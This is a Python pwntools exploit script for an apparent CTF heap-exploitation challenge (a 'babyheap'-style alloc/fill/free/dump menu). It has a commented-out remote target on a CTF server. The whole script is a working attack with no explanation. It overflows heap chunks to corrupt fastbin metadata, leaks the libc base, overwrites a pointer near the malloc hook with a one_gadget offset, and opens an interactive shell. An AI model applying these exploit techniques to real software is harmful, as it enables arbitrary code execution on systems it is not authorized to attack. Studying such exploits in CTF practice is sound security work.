from pwn import *
import sys
#context.terminal = ["tmux", "splitw", "-v"]
#context.terminal = ['tmux', 'splitw', '-v']
#context.log_level = "debug"

context.terminal=["tmux","splitw","-h"] 
#elf = ELF("./pwn")
#libc = ELF("./libc-2.23 .so")
#p = process("./pwn1")
#gdb.attach(p)
p=gdb.debug("./pwn1")
#ENV = {"LD_PRELOAD":"./libc.so.6"} 
#p=remote('node4.buuoj.cn',26817)
#gdb.attach(p)
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
 
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
 
def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
 
def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()
 
 
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

#gdb.attach(p)

free(1)
free(2)
 
#gdb.attach(p)

payload = p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)
fill(0, payload)
 
#gdb.attach(p)

payload = p64(0)*3+p64(0x21)
fill(3, payload)

#gdb.attach(p)
 
alloc(0x10)
alloc(0x10)
	
#gdb.attach(p)
 
payload = p64(0)*3+p64(0x91)
fill(3, payload)

alloc(0x80)
free(4)

#gdb.attach(p)

libc_base = u64(dump(2)[:8].strip().ljust(8,b"\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))
 
alloc(0x60)

free(4)
 
payload = p64(libc_base+0x3c4aed)
fill(2, payload)
 
alloc(0x60)
alloc(0x60)
 
payload = p8(0)*3+p64(0)*2+p64(libc_base+0x4526a)
fill(6, payload)
 
alloc(255)
 
p.interactive()

